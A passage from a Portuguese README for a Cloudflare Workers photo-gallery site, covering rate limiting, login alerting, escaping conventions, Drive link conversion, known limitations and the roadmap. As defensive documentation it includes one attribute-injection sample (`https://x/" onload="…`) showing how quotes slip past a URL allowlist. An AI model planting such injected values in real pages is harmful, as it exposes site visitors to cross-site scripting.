O orçamento de CPU do hashing é vigiado pelo sinal real, não por um número: estourá-lo mata a requisição, então o CI reprova pelo `healthz` não voltar `ok:true` e pelo login não voltar 302. (Havia aqui um portão `hashMs > 200`; ele nunca podia reprovar, porque o Workers congela `Date.now()` durante execução síncrona — RETOMADA §5.9.) O smoke test pós-deploy (`deploy.yml`) também cobre as páginas públicas mais novas (`/sobre`, `/equipamentos`, `/termos`, `/privacidade`, `/suporte`) e os endpoints de SEO/segurança (`/sitemap.xml`, `/robots.txt`, `/llms.txt`, `/.well-known/security.txt`, `/.well-known/gpc.json`) com `check_status`, e loga (sem falhar o build) se `selftest.problems` do healthz vier não-vazio — isso é sinal de dado de evento mal configurado, não de regressão de código.

---

## Rate limiting

`checkRateLimit(env, ip, key, limit, windowSecs)`:

- Calcula `window = floor(Date.now() / (windowSecs * 1000))` — bucket de tempo fixo.
- Chave KV: `ratelimit:<key>:<ip>:<window>`.
- Lê contador. Se `>= limit`, retorna `false`. Senão, incrementa com `expirationTtl = windowSecs`.

| Endpoint | key | limit | janela |
| --- | --- | --- | --- |
| `/api/removal-request` | `removal` | 5 | 1 h |
| `/api/track-drive` | `drive` | 60 | 1 h |
| `/api/suporte` | `support` | 5 | 1 h |
| `/api/drive-link` (caminho verificado, com Turnstile) | `drive-link` | 60 | 1 h |
| `/api/drive-link` (caminho `noscript`, sem Turnstile — ad-blocker) | `drive-link-noscript` | 10 | 1 h |
| `/dashboard/login` (rajada) | `login` | 10 | 10 min |
| `/dashboard/login` (sustentado) | `login-day` | 60 | 24 h |

O login tem **dois** limites porque um só não fechava a conta: 10 por 10 min
segura a rajada, mas deixa passar ~1400 tentativas por dia do mesmo IP — folgado
demais para uma senha única. O teto diário fecha isso sem atrapalhar quem erra a
senha algumas vezes de manhã e volta à tarde.

Independente do bloqueio, falhas de login são **contadas e alertadas**: a partir
de 5 em 15 min, o dono recebe e-mail (`sendLoginAlert`, com cooldown próprio de
30 min para não virar flood). Antes desta revisão, uma força bruta era
completamente silenciosa — o rate limit segurava o volume, mas ninguém ficava
sabendo que houve tentativa.

Camadas que **não** custam KV, complementando o rate limit nos formulários
públicos: honeypot (campo isca invisível), token de formulário assinado com
idade mínima de 3 s (derruba automação que preenche e envia instantaneamente) e
supressão de mensagem duplicada no suporte (hash truncado da mensagem por IP,
TTL de 1 h).

Limitações: usa janela fixa (não sliding) e não é atômico (race em alta concorrência). Aceitável porque os endpoints públicos são de baixíssima taxa.

IP vem de `request.headers.get('CF-Connecting-IP')` (header injetado pelo edge da Cloudflare).

---

## Convenções e detalhes do código

- **PT-BR** em todo conteúdo, mensagens de erro e comentários.
- **Sem dependências runtime**. As dev deps são só `wrangler`, `vitest` e `eslint` (+ `@eslint/js`).
- **Sem TypeScript**, sem build, sem JSX. Template strings + `escape()`.
- **`escape()`** (em `utils.js`) é o único mecanismo de escape de **HTML**. Use sempre que interpolar valor de usuário. JSON inline em `<script>` usa `.replace(/</g, '\\u003c').replace(/>/g, '\\u003e')` em vez de `escape()`.
- **`safeUrl()`** é coisa diferente e **não substitui** o `escape()`: é allowlist de *esquema* (deixa passar só `https:`, promove `http:`, mata `javascript:`/`data:`), e não escapa aspas — `https://x/" onload="…` passa inteiro por ela. Num atributo HTML use as duas, `escape(safeUrl(v))`; numa atribuição de propriedade no cliente (`el.href = v`) o `safeUrl()` basta, porque não há HTML sendo parseado. Nenhuma das duas sozinha cobre os dois ataques — ver `SECURITY.md`, seção *Invariants for contributors*.
- **`toCount()`** (em `index.js`) é obrigatório ao ler contador do KV. Contadores são strings; um valor corrompido lido com `parseInt` cru vira `NaN`, e `String(NaN)` gravado de volta envenena o contador para sempre.
- **`generateId()`** → 16 bytes random hex (32 chars). Usado para event id e removal request id.
- **`formatDatePT(dateStr)`** → "12 de maio de 2025" (mês em português, dia/ano numéricos). Aceita `YYYY-MM-DD`; retorna string original se inválida.
- **`toHttps(url)`** → reescreve `http://` para `https://`, no-op caso contrário. Aplicado em todo URL de foto/Drive ao salvar.
- **CSS variables**: o dashboard usa seu próprio esquema (`--bg`/`--bg2`/`--bg3`/`--text`/`--text2`/`--text3`/`--accent`/`--red`/`--green`, declarado uma vez no `BASE`, herdado em todos os panels, sempre escuro). As páginas públicas têm seu próprio esquema, independente e não intercompatível com o do dashboard (`--bg-page`/`--text`/`--accent`/etc., variando um pouco por arquivo conforme o que cada um precisa), com um bloco `@media(prefers-color-scheme:light)` sobrescrevendo os valores no tema claro — ver "Páginas públicas" acima.
- **Dicas de conexão (`<link rel="preconnect">`)**: saem de `fontPreconnectHTML()` e `photoPreconnectHTML()`, em `utils.js` — não escreva a tag à mão numa página nova. O Google Fonts usa **dois** hosts (`fonts.googleapis.com` serve o CSS, `fonts.gstatic.com` serve os WOFF2), e preconectar só ao primeiro não adianta nada: o handshake que importa é o do segundo, e ele só começa depois do CSS chegar e ser parseado. O `crossorigin` vai **só** no de fonte — busca de fonte é CORS, busca de folha de estilo e de `<img>` não são, e o browser mantém pools de conexão separados para os dois modos, então o atributo no lugar errado abre uma conexão que a busca real não reaproveita. `tests/rendered-pages.test.js` trava o par em toda página e recusa preconnect a host que a CSP não permite.
- **Acessibilidade**: `aria-label` nos botões de ícone do carrossel/modal, `autocomplete` apropriado nos forms, foco gerenciado nos modais.
- **Mobile-first**: media queries só para "subir" colunas/larguras. Sheets mobile saem do bottom; em ≥ 580px viram modal centralizado.

---

## Como o Drive vira foto na página

Em `src/ui/dashboard.js`, `convertDriveUrl(url)` aceita três formatos de link do Google Drive:

| Entrada | Saída |
| --- | --- |
| `https://drive.google.com/file/d/<ID>/...` | `https://lh3.googleusercontent.com/d/<ID>` |
| `https://drive.google.com/open?id=<ID>` | `https://lh3.googleusercontent.com/d/<ID>` |
| `https://drive.google.com/uc?...id=<ID>` | `https://lh3.googleusercontent.com/d/<ID>` |
| Qualquer outra URL | sem mudança |

Aplicado on-blur no campo de cada foto no form. A miniatura logo aparece (img com `onload`/`onerror`). O `lh3.googleusercontent.com/d/<ID>` é o endpoint público que serve a foto otimizada (não requer login).

Isso significa que o admin só precisa colar o link compartilhado do arquivo no Drive — a conversão é automática.

---

## Limitações conhecidas

- **Contadores não atômicos**: `views`, `drive_clicks` e `ratelimit` são read-modify-write. Em alta concorrência, alguns incrementos podem ser perdidos. Aceitável aqui.
- **Sem CDN próprio para fotos**: thumbnails vêm direto do Google. Se o Drive ficar offline ou rate-limitado, a galeria mostra placeholders. Migrar para R2 está no roadmap.
- **Preview no WhatsApp depende do Google**: o cartão já vai completo (título, fatos, `og:image` recortado em 1200×630 **com as dimensões declaradas** — ver [Cartão de pré-visualização do link](#cartão-de-pré-visualização-do-link-open-graph)), mas a imagem ainda sai do `lh3.googleusercontent.com`, que o scraper do WhatsApp às vezes não consegue buscar. Quando não consegue, o cartão aparece só com texto. R2 resolveria o que sobra.
- **Sessões expiram em 24 h**: sem refresh automático. Após 24 h, qualquer ação no painel cai em 401 e o frontend redireciona pra login.
- **Sem multi-tenant**: o app inteiro assume um único admin (chave `admin_password`).
- **CPU budget do Worker**: o hashing PBKDF2 (100k iterações) roda no `/api/healthz` como canário — se não couber no orçamento de CPU, a requisição morre e o CI reprova (healthz sem `ok:true`, login sem 302). Não dá para medir o tempo de dentro do isolate (RETOMADA §5.9); ao mexer no `iterations`, o número real está nas métricas do Worker no painel da Cloudflare.
- **Upload de remoção limitado a 2 MB**: maior que isso e o request vira 413. Solicitantes com fotos grandes podem usar a opção "link direto" em vez de upload.
- **Storage de solicitações capado em 500**: solicitações resolvidas mais antigas são apagadas quando passa. Backup manual recomendado antes de atingir esse volume.
- **Log de consentimento é best-effort**: o D1 (`CONSENT_DB`) está provisionado e o `/api/healthz` reporta `d1: "ok"`, mas a gravação roda em `ctx.waitUntil` — se o insert falhar, o visitante recebe o link do mesmo jeito e a falha só aparece no log. Se o binding for removido, o aceite continua barrando o acesso normalmente, porém sem registro (no-op silencioso).
- **Sem nonce de curta duração no `/api/drive-link`**: o gate já é verificado no servidor (Turnstile fail-closed + rate limit por IP), mas ainda não há um nonce por carregamento de página amarrando a chamada a uma visita real do evento — um script com um token Turnstile válido em mãos ainda poderia varrer vários slugs. Rate limit por IP mitiga isso parcialmente; nonce fica no roadmap (`TODO.md`, Etapa 3.1).
- **Formulários e gate exigem JavaScript + Turnstile**: ad-blockers que barram o script do Turnstile (ou JS desativado) impedem o envio dos formulários de remoção/suporte e a verificação do gate. O site **detecta e avisa** (desative o bloqueador / ative o JS), mantém o acesso às fotos liberado e oferece WhatsApp/e-mail como alternativa; banners `<noscript>` cobrem o caso sem JS.

---

## Roadmap (TODO.md)

O arquivo [`TODO.md`](./TODO.md) lista **só o que está em aberto** — item entregue sai de lá, e o histórico de quem fez o quê fica no `git log`. Resumo do que falta:

**Segurança / anti-abuso**: nonce de curta duração no `/api/drive-link` (anti-varredura de slugs — requer decisão sobre cota de KV vs. secret novo), auditar vazamento de `internalNotes` no HTML público, magic link no painel, honeypot nos formulários, endurecer a CSP, afinar WAF/Bot Fight Mode, strip de EXIF. Política e invariantes em [`SECURITY.md`](./SECURITY.md).

**Operação**: marcar releases com tag (hoje o repo não tem nenhuma — ver [Rollback](#rollback)); destino persistente para o beacon de `/api/perf` (binding `PERF` do Analytics Engine).

**Recursos**: senha por evento, migração das imagens para R2 (resolve preview no WhatsApp e cache das capas de uma vez), portfólio `/portfolio`, lembrete de data de entrega, modelo/"template" de evento (ao lado do "Duplicar" já existente), guardar a proporção da foto na hora de curar o evento para eliminar o reflow residual do grid masonry.

**Ideias não priorizadas**: favoritar fotos via localStorage, livro de visitas, slideshow, stories, `/contato`, depoimentos, status "agendando eventos", i18n EN/PT, links nominados por convidado, download em ZIP, app nativo, mini-gráfico de visualizações no dashboard.

---

## Contato

Site: <https://fotos.lucafchala.com> · Instagram: [@lucafchala](https://instagram.com/lucafchala) · Suporte: <suporte@lucafchala.com> · WhatsApp: <https://wa.me/5511989211178>
